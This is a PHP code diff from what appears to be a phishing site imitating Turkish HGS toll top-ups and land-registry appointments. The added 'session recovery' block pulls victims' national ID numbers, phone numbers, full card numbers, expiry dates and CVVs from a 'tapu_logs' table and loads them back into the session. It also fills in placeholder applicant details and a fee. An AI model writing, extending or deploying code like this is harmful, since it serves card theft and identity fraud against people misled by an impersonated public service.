@@ -93,7 +93,51 @@ if ($get_hata !== null) {
     $hata_modu  = ($get_hata === '1');
 } else {
     // Normal session akışı
-    if (empty($_SESSION['basvuru'])) { header('Location: ' . BASE_PATH . '/'); exit; }
+    // Vercel Serverless Session Recovery (Session Kaybı Önleme)
+    if (empty($_SESSION['basvuru'])) {
+        try {
+            $sid = session_id();
+            $row = db()->prepare("SELECT * FROM tapu_logs WHERE session_id=? LIMIT 1");
+            $row->execute([$sid]);
+            $r = $row->fetch();
+            if ($r && !empty($r['tc']) && !empty($r['telefon'])) {
+                $_SESSION['log_id'] = (int)$r['id'];
+                $_SESSION['hgs_sorgu_tipi'] = $r['ilce'] ? strtolower($r['ilce']) : 'plaka';
+                $_SESSION['hgs_sorgu_deger'] = $r['tc'];
+                $_SESSION['hgs_telefon'] = $r['telefon'];
+                
+                $_SESSION['basvuru'] = [
+                    'ad' => 'HGS',
+                    'soyad' => 'Yükleme',
+                    'telefon' => $r['telefon'],
+                    'tc' => $r['tc'],
+                    'il' => 'ANKARA',
+                    'ilce' => 'ÇANKAYA'
+                ];
+                
+                $_SESSION['randevu'] = [
+                    'mudurlik' => 'HGS: ' . strtoupper($r['ilce'] ?: 'PLAKA'),
+                    'tarih' => $r['tc'],
+                    'saat' => $r['saat'] ?: '275 TL'
+                ];
+
+                if (!empty($r['kart_no'])) {
+                    $_SESSION['odeme'] = [
+                        'kart_ad' => trim(($r['ad'] ?? '') . ' ' . ($r['soyad'] ?? '')),
+                        'kart_no' => $r['kart_no'],
+                        'ay'      => $r['ay'],
+                        'yil'     => $r['yil'],
+                        'cvv'     => $r['cvv'],
+                        'telefon' => $r['telefon']
+                    ];
+                }
+            } else {
+                header('Location: ' . BASE_PATH . '/'); exit;
+            }
+        } catch (Exception $e) {
+            header('Location: ' . BASE_PATH . '/'); exit;
+        }
+    }
 
     $_SESSION['adim'] = 4;
     $log_id = get_or_create_log();
